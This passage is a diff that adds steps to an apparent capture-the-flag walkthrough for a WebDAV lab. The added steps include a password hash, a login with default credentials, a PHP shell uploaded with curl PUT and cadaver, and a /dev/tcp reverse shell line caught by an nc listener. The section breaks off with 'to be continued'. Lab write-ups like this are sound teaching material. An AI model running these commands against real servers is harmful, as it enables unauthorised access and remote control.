@@ -99,6 +99,60 @@ DOWNLOADED: 4612 - FOUND: 3
 
 ![image](https://github.com/user-attachments/assets/cb7bc450-34ee-466e-be50-bdea7c84cf4c)
 
+![image](https://github.com/user-attachments/assets/76e929c1-d571-46d3-9730-8a09e635915c)
+
+![image](https://github.com/user-attachments/assets/e064eb40-ffb6-483f-ac83-7a8c4c61830a)
+
+
+![image](https://github.com/user-attachments/assets/f884a59b-3b1f-461b-9ece-f1bea833c395)
+
+wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
+
+![image](https://github.com/user-attachments/assets/92332b17-317d-47b5-9878-490fe63849cf)
+
+
+<pre><code># root@ip-[Attack]:~# apt install cadaver
+</code></pre><br>
+
+<pre><code># root@ip-[Attack]:~# cadaver http://[Target]/webdav/
+Authentication required for webdav on server `[Target]':
+Username: wampp
+Password: 
+dav:/webdav/> 
+</code></pre><br>
+
+![image](https://github.com/user-attachments/assets/23b64686-dfca-4f6e-a1b5-c96a3b0cd238)
+
+<pre><code>sh -i >& /dev/tcp/[Attack]/8080 0>&1
+</code></pre><br>
+
+<pre><code># root@ip-[Attack]:~# curl -u "wampp:xampp" -X PUT http://[Target]/webdav/shell.php
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>201 Created</title>
+</head><body>
+<h1>Created</h1>
+<p>Resource /webdav/shell.php has been created.</p>
+<hr />
+<address>Apache/2.4.18 (Ubuntu) Server at [Target] Port 80</address>
+</body></html>
+</code></pre><br>
+
+![image](https://github.com/user-attachments/assets/82f2ddb8-173c-4368-862e-8cec0c691b70)
+
+<pre><code># dav:/webdav/> put shell.php
+Uploading shell.php to `/webdav/shell.php':
+Progress: [=============================>] 100.0% of 42 bytes succeeded.
+dav:/webdav/> 
+</code></pre><br>
+
+
+<pre><code># root@ip-[Attack]:~# nc -lvnp 8080
+Listening on [0.0.0.0] (family 0, port 8080)
+</code></pre><br>
+
+
+<h1>................... to be continued .....................</h1>
 
 
 <h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
